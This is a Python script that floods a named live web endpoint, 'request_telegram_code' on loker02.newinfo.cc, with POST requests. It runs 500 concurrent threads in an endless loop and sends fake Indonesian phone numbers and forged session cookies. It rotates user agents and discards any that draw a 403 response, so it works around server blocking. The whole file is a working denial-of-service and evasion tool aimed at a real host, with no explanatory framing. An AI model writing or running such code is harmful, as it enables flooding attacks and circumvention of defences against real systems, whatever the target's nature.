import requests
import concurrent.futures
import random
import time
import string
import json

# Base URL and headers (without the user-agent and cookie)
URL = 'http://loker02.newinfo.cc/request_telegram_code'
HEADERS = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'http://loker02.newinfo.cc',
    'Connection': 'keep-alive',
    'Referer': 'http://loker02.newinfo.cc/main',
    'Priority': 'u=0'
}

def load_user_agents(filename='ua.txt'):
    # Load user agents from a file
    try:
        with open(filename, 'r') as f:
            user_agents = [line.strip() for line in f if line.strip()]
            if not user_agents:
                raise ValueError("User agents file is empty.")
            return user_agents
    except FileNotFoundError:
        print(f"Error: The file {filename} was not found.")
        return []
    except Exception as e:
        print(f"Error reading {filename}: {e}")
        return []

# Load user agents from 'ua.txt' file
USER_AGENTS = load_user_agents()
INVALID_USER_AGENTS = set()  # Track user agents that get 403

def random_phone():
    # Generate random Indonesian phone numbers starting with +628
    return "+628" + "".join(random.choice(string.digits) for _ in range(9))

def random_cookie():
    # Generate random session cookie data
    session_id = ''.join(random.choices(string.ascii_letters + string.digits + '-._', k=64))
    return f'session=.eJwtysmOokAAANB_{session_id}'

def send_request():
    global USER_AGENTS
    if not USER_AGENTS:
        print("No user agents available.")
        return
    
    # Select a random user-agent from available options
    user_agent = random.choice(USER_AGENTS)
    headers = HEADERS.copy()
    headers['User-Agent'] = user_agent
    headers['Cookie'] = random_cookie()
    
    # Randomized phone number for JSON payload
    payload = {"phone": random_phone()}

    try:
        response = requests.post(URL, headers=headers, data=json.dumps(payload))
        if response.status_code == 200:
            print("Request sent successfully.")
        elif response.status_code == 403:
            print(f"User-Agent {user_agent} resulted in 403 Forbidden. Removing from list.")
            USER_AGENTS = [ua for ua in USER_AGENTS if ua != user_agent]  # Remove the user agent
            INVALID_USER_AGENTS.add(user_agent)  # Optionally, add to invalid list for tracking
        else:
            print(f"Request failed with status code {response.status_code}.")
    except Exception as e:
        print(f"Request failed due to an error: {e}")

def main():
    # Infinite loop to send requests continuously
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
        while True:
            # Submit 500 concurrent requests
            futures = [executor.submit(send_request) for _ in range(500)]
            concurrent.futures.wait(futures)
            time.sleep(0.001)  # 1 millisecond delay

if __name__ == "__main__":
    main()
